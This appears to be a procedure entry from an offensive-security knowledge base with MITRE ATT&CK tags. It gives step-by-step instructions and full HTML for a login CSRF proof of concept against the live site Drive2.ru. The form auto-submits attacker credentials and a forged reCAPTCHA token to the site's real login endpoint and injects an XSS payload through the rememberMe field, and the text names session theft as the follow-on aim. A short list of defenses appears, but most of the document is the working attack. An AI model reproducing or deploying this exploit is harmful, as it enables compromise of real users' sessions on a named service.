---
id: proc-uuid-2
tags:
  - csrf
  - xss
  - poc-creation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:49.373Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
---

# Craft-Malicious-CSRF-Form-for-Login-Bypass

## Summary

This procedure creates a malicious HTML form that exploits the CSRF vulnerability on Drive2.ru by posting attacker credentials without FCTX validation, bypassing reCAPTCHA, and injecting an XSS payload via the rememberMe parameter.

## Description

Target the login endpoint https://www.drive2.ru/reception/?.AMRU=https%3A%2F%2Fwww.drive2.ru%2F in a web attack scenario. The form auto-submits on page load, forging a login request that logs the victim in as the attacker while executing JavaScript for further exploitation like session theft.

## Requirements

1. Text editor (e.g., VS Code)
2. Knowledge of HTML and basic JavaScript
3. Attacker's valid login credentials for Drive2.ru

## Defense

Defensive measures and detection strategies:

- Require unique CSRF tokens per session and validate them server-side
- Integrate reCAPTCHA v3 with score-based challenges
- Output-encode all parameters to block XSS
- Use Content-Security-Policy to restrict script execution

## Objectives

1. Forge a login request to impersonate the attacker
2. Embed XSS for immediate code execution post-login
3. Ensure auto-submission for seamless CSRF trigger

## Instructions

### Step 1: Set Up HTML Structure

**Context**: Create the base form pointing to the vulnerable endpoint.

In a text editor, write:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf-form" action="https://www.drive2.ru/reception/?.AMRU=https%3A%2F%2Fwww.drive2.ru%2F" method="POST">
<input type="hidden" name="login" value="attacker_username">
<input type="hidden" name="password" value="attacker_password">
<input type="hidden" name="g-recaptcha-response" value="fake-recaptcha-token">
<input type="hidden" name="rememberMe" value="<img src=x onerror=alert(document.domain)>">
</form>
</body>
</html>
```

> This sets up hidden fields with exploit data.

### Step 2: Add Auto-Submit Script

**Context**: Use JavaScript to submit the form immediately on load.

Add before </body>:

```html
<script>document.getElementById('csrf-form').submit();</script>
```

> Ensures the CSRF triggers without user interaction.

### Step 3: Test the Form Locally

**Context**: Validate the PoC by opening in a browser while logged into Drive2.ru.

Save as .html and load in a new tab. Monitor network requests.

> Expected: Form submits, logs in as attacker, and alerts domain via XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[xss]]
- [[bypass]]
